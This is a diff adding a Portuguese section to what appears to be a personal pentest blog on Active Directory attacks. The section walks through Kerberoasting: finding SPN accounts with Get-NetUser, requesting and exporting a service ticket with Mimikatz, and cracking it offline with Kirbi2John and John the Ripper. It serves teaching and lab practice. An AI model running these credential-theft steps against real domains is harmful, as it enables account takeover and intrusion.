@@ -48,7 +48,42 @@ No passo 3 o TGT, que foi apresentado pelo KDC/DC, podemos requisitar a autoriza
 
 Requisitamos o ticket de um serviço que está sendo executado com *privilégios avançados*, vulgo SPN, `Service Principal Name`
 
+Com o comando `Get-NetUser -SPN` verificamos quais usuários estão com essas permissões habilitadas, no caso em questão verificamos que o usuário `sqlreportuser` está como SPN
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/spn.png)
+
+Uma vez sabendo disso podemos requisitar o Ticket dele para nossa seção
+
+`Request-SPN Ticket MSSQLSvc/xxxxxxxx`
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/spn1.png)
+
+Verificamos que o Ticket foi injetado na nossa seção
+
+`klist`
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/spn2.png)
+
+Agora podemos exportar ele para quebrar a senha offline
+
+`Invoke-Mimikatz -Command '"kerberos::list /export"'`
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/spn3.png)
+
+Ele foi salvo para um arquivo `.kirbi`
+
+Agora passamos ele para nossa Kali e com o utilitário Kirbi2John transformamos em um formato que pode ser lido pelo John
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/spn4.png)
+
+Agora quebramos a senha
+
+`john --wordlist=./filtered_top_100k.txt ticket.hash`
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/spn5.png)
+
 ### Unconstrained Delegation
+
 
 ### Constrained Delegation
 
